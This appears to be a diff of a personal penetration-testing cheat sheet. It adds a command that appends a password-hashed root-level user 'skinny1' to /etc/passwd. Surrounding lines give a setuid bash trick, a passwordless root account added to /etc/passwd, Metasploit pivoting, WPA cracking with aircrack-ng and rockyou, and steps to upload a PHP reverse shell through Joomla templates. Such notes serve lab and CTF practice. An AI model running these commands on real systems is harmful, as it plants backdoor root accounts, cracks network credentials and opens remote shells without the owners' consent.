@@ -83,6 +83,7 @@ chmod +s /bin/bash
 > 1. Check who owns -> ls -lart /etc/passwd && who owns ls -lart /etc/shadow. 
 > 1. Making user **fm** the root by typing command ->  echo fm::0:0:root:/root:/bin/bash >> /etc/passwd
 > 1. openssl for generating password hashes command -> openssl passwd -1
+> 1. ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
 
 #### Pivoting crap - MSF, socks4a and proxychains
 > 1. use msf exploit/multi/handler
@@ -243,7 +244,7 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 > 1. print only 1st field before ":" `cut -d ":" -f1  myfile.txt.2 > usernames`
   
 #### Cracking passwords from .pcap file
-> 1. ```bash aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```
+> 1. ```aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```
 
 #### Joomla Reverse Shell
 > 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
